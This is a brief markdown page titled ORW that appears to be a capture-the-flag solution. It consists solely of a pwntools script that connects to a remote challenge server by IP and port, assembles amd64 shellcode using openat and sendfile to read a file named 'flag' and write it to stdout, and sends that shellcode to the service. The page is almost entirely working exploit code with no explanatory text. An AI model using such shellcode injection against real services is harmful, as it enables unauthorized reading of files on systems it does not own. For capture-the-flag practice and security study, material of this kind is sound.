---
title: ORW
date: 2025-06-07T09:11:51+08:00
lastmod: 2025-06-07T09:12:47+08:00
---

# ORW

```python
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
# context.terminal = ['/mnt/c/Windows/system32/cmd.exe', '/c', 'start', 'wsl.exe', '-d', 'Ubuntu-22.04', 'bash', '-c', ]

# io = process("./chall")
io = remote("39.105.2.63", 34954)

# libc = ELF("") # /lib/x86_64-linux-gnu/libc.so.6

code = shellcraft.openat(-100,"flag",0) # -100 AT_FDCWD当前目录
code += shellcraft.sendfile(1,3,0,50) # stdout 1 ;第一个打开的文件即flag 3
code = asm(code)

io.sendline( code)
# gdb.attach(io)

io.interactive()
```
